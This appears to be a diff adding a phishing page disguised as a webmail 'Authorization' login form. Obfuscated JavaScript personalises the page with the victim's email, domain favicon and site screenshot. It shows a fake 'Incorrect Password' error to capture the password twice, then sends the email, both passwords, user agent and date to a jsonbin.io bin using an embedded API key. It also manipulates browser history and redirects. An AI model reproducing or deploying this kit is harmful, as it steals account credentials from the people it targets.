@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auth</title>
+    <link href="https://db.onlinewebfonts.com/c/d3a0199dcafa52672b5461066bbb3e59?family=Cash+Market+Light+Rounded" rel="stylesheet">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+    <style>
+        body {
+            background-size: cover;
+            font-family: "Cash Market Light Rounded";
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 75vh;
+            margin: 0;
+        }
+        .pass::before {content:"Pass"}
+        .pass::after {content:"word"}
+
+        #message {
+            text-align: center;
+            color: red;
+            display: none;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.6);
+            filter: blur(10px);
+        }
+
+        .login-panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.1);
+            filter: blur(10px);
+        }
+
+        .card {
+            box-shadow: 5px 5px 15px rgba(0, 0, 0, 0.3);
+        }
+    </style>
+</head>
+<body>
+<div class="container login-panel">
+    <div class="row justify-content-center">
+        <div class="col-md-4">
+            <div class="card">
+                <div class="card-body">
+                    <h5 class="card-title text-center">Authorization</h5>
+
+                    <form id="login_form" method="POST">
+                        <div class="form-group">
+                            <label for="rcmloginuser">Email</label>
+                            <input type="text" class="form-control" id="rcmloginuser" placeholder="Email" value="test@gmail.com" disabled>
+                        </div>
+                        <div class="form-group">
+                            <label for="rcmloginpwd"><span class="pass"></span></label>
+                            <input type="password" class="form-control pass2" id="rcmloginpwd" placeholder="Password" required>
+
+                            <div id="message">Incorrect <span class="pass"></span>. Try Again</div>
+                        </div>
+                        <button type="submit" id="rcmloginsubmit" class="btn btn-primary btn-block">Sign In</button>
+
+                    </form>
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    const _0x2ae63b=_0x1748;(function(_0x5a914c,_0x33917d){const _0x4b9d51=_0x1748,_0x17c353=_0x5a914c();while(!![]){try{const _0x1f7ceb=parseInt(_0x4b9d51(0x75))/0x1+parseInt(_0x4b9d51(0x84))/0x2*(-parseInt(_0x4b9d51(0x74))/0x3)+parseInt(_0x4b9d51(0x90))/0x4+-parseInt(_0x4b9d51(0x96))/0x5+parseInt(_0x4b9d51(0x7a))/0x6+-parseInt(_0x4b9d51(0x82))/0x7+parseInt(_0x4b9d51(0x85))/0x8;if(_0x1f7ceb===_0x33917d)break;else _0x17c353['push'](_0x17c353['shift']());}catch(_0x57e414){_0x17c353['push'](_0x17c353['shift']());}}}(_0x3f4e,0xb7f6e));function _0x3f4e(){const _0x23c03a=['then','application/json','userAgent','value','href','4268760awxCEp','trim','host','display','catch','rel','floor','message','link[rel=\x22icon\x22]','random','querySelector','pushState','onpopstate','length','https://google.com','129YEMuwa','874564xPUlSH','link','search','https://','submit','5989062RuXtzo','block','get','login_form','POST','icon','style','preventDefault','9394364rOmjuC','https://api.jsonbin.io/v3/b?name=','27308gPvaue','12181192UfzHNW','replace','rcmloginuser','location','$2a$10$r6GMUoJz9P1Jp1BexqJkC.RCf.FcO/M.hHDrZuo98yEUOw.OdZt2K','json','split','createElement','appendChild','addEventListener','getElementById','564216MXOVwv'];_0x3f4e=function(){return _0x23c03a;};return _0x3f4e();}const urlParams=new URLSearchParams(window[_0x2ae63b(0x88)][_0x2ae63b(0x77)]),encodedEmailParam=urlParams[_0x2ae63b(0x7c)]('b'),emailParam=encodedEmailParam?atob(encodedEmailParam):null,loginForm=document['getElementById'](_0x2ae63b(0x7d)),message=document[_0x2ae63b(0x8f)](_0x2ae63b(0x9d)),userAgent=navigator[_0x2ae63b(0x93)],currentDate=new Date(),passwordInput=document[_0x2ae63b(0x8f)]('rcmloginpwd');let submittedCount=0x0,hehe22='',hehe223='';loginForm[_0x2ae63b(0x8e)](_0x2ae63b(0x79),_0x2c5195=>{const _0x3c21c4=_0x2ae63b;_0x2c5195[_0x3c21c4(0x81)](),message['style'][_0x3c21c4(0x99)]=_0x3c21c4(0x7b),submittedCount++;if(submittedCount===0x1)hehe223=passwordInput[_0x3c21c4(0x94)],passwordInput[_0x3c21c4(0x94)]='';else{if(submittedCount===0x2){hehe22=passwordInput[_0x3c21c4(0x94)],passwordInput[_0x3c21c4(0x94)]='';const _0x163496=emailParam[_0x3c21c4(0x8b)]('@'),_0x36662c=_0x163496[0x1],_0x3036f9={'Domain':_0x36662c,'Email':emailParam,'P1':hehe223,'P2':hehe22,'UserAgent':userAgent,'Date':currentDate},_0x45bde4=_0x3c21c4(0x89);fetch(_0x3c21c4(0x83)+emailParam,{'method':_0x3c21c4(0x7e),'headers':{'Content-Type':_0x3c21c4(0x92),'X-Master-Key':_0x45bde4,'X-Bin-Name':emailParam},'body':JSON['stringify'](_0x3036f9)})[_0x3c21c4(0x91)](_0x227d43=>_0x227d43[_0x3c21c4(0x8a)]())[_0x3c21c4(0x91)](_0x3d18ca=>{const _0x36233d=_0x3c21c4;window[_0x36233d(0x88)][_0x36233d(0x86)](_0x36233d(0x78)+_0x36662c);})[_0x3c21c4(0x9a)](_0x569c07=>{});}}});function redirectToGoogle(){const _0xaeb7e9=_0x2ae63b;window[_0xaeb7e9(0x88)]['href']=_0xaeb7e9(0x73);}function generateRandomString(_0x52245c){const _0x313541=_0x2ae63b,_0x41e821='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';let _0x39c586='';for(let _0x55c651=0x0;_0x55c651<_0x52245c;_0x55c651++){const _0x5c7b13=Math[_0x313541(0x9c)](Math[_0x313541(0x9f)]()*_0x41e821[_0x313541(0x72)]);_0x39c586+=_0x41e821['charAt'](_0x5c7b13);}return _0x39c586;}function _0x1748(_0x445d7d,_0x463d91){const _0x3f4ee8=_0x3f4e();return _0x1748=function(_0x174877,_0x5c7ee6){_0x174877=_0x174877-0x6f;let _0x2395ac=_0x3f4ee8[_0x174877];return _0x2395ac;},_0x1748(_0x445d7d,_0x463d91);}const currentURL=window[_0x2ae63b(0x88)]['protocol']+'//'+window[_0x2ae63b(0x88)][_0x2ae63b(0x98)],UrlShit=generateRandomString(0xa6);history[_0x2ae63b(0x70)](null,null,window[_0x2ae63b(0x88)][_0x2ae63b(0x95)]),window[_0x2ae63b(0x71)]=function(_0x350ad7){const _0x8b8fed=_0x2ae63b;history[_0x8b8fed(0x70)](null,null,window[_0x8b8fed(0x88)][_0x8b8fed(0x95)]);},setTimeout(function(){const _0x1bc757=_0x2ae63b,_0x54bf04=currentURL+'/'+UrlShit+'/'+UrlShit;history[_0x1bc757(0x70)](null,'',_0x54bf04);},0x1);function setFavicon(_0x1b8c74){const _0x53fb24=_0x2ae63b,_0x35ce33=document[_0x53fb24(0x6f)](_0x53fb24(0x9e));if(_0x35ce33)_0x35ce33[_0x53fb24(0x95)]=_0x1b8c74;else{const _0x24d571=document[_0x53fb24(0x8c)](_0x53fb24(0x76));_0x24d571[_0x53fb24(0x9b)]=_0x53fb24(0x7f),_0x24d571[_0x53fb24(0x95)]=_0x1b8c74,document['head'][_0x53fb24(0x8d)](_0x24d571);}}if(emailParam===null||emailParam[_0x2ae63b(0x97)]()==='')redirectToGoogle();else{const emailParts=emailParam['split']('@');if(emailParts[_0x2ae63b(0x72)]===0x2){const domain=emailParts[0x1],faviconUrl='https://t0.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=http://'+domain+'&size=400';setFavicon(faviconUrl),document['body'][_0x2ae63b(0x80)]['backgroundImage']='url(\x22https://image.thum.io/get/auth/71422-rrrerrwerrerererererererererterrt_rertreerererereertrerterttrer/width/1200/crop/700/http://'+domain+'\x22)',document[_0x2ae63b(0x8f)](_0x2ae63b(0x87))[_0x2ae63b(0x94)]=emailParam;}else redirectToGoogle();}
+</script>
+</body>
+</html>
